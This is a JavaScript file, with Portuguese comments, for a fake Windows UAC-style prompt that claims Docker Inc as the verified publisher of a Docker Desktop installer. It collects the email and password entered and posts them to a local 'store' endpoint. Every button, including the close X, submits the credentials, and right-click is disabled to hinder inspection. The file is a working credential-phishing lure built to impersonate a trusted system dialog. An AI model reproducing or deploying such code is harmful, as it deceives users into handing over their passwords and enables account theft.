const azul = document.querySelector('.azul');
const texto = document.querySelector('.texto')

clicou = false

azul.addEventListener('click', () => {
    if (!clicou) {
        clicou = true
        azul.innerHTML = 'Ocultar detalhes';
        texto.innerHTML =
            'Fornecedor verificado: Docker Inc<BR>Origem do arquivo: Disco rígido deste computador<BR>Local do programa: "C:\Users\MURILODEOLIVEIRAMART \Downloads\Docker Desktop Installer.exe" "install" -package "res:DockerDesktop" --relaunch-as-admin<BR><blue>Mostrar informações sobre o certificado do fornecedor</blue>'
    } else {
        clicou = false
        azul.innerHTML = 'Mostrar mais detalhes';
        texto.innerHTML =
            'Fornecedor verificado: Docker Inc<BR>Origem do arquivo: Disco rígido deste computador'
    }
})








// Função para lidar com o envio do formulário
async function handleSubmit(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let senha = document.getElementById("senha").value;

    let data = {
        email,
        senha
    };

    try {
        const response = await fetch('http://localhost:3010/api/store/task', {
            method: "POST",
            headers: { "Content-type": "application/json;charset=UTF-8" },
            body: JSON.stringify(data)
        });

        const content = await response.json();
        console.log(content); // Aqui você pode decidir o que fazer com o conteúdo da resposta

        // Fechar a janela ou fazer outra ação após o envio
        await window.close();
    } catch (error) {
        console.error('Erro ao enviar dados:', error);
        // Lógica para lidar com o erro, se necessário
    }
}

let xbutton = document.querySelector(".X");
let button1 = document.querySelector(".botao");
let button2 = document.querySelector(".botao2");

xbutton.onclick = handleSubmit;
button1.onclick = handleSubmit;
button2.onclick = handleSubmit;

// Evento de pressionamento de tecla no campo de senha
document.getElementById("senha").addEventListener("keydown", function(event) {
    // Verifica se a tecla pressionada foi "Enter" (código 13)
    if (event.key === "Enter") {
        // Verifica se o campo de senha está focado para evitar conflitos
        if (document.activeElement === document.getElementById("senha")) {
            handleSubmit(event);
        }
    }
});

window.addEventListener('contextmenu', function (e) {
    // Cancela o evento padrão para evitar que o menu de contexto apareça
    e.preventDefault();
});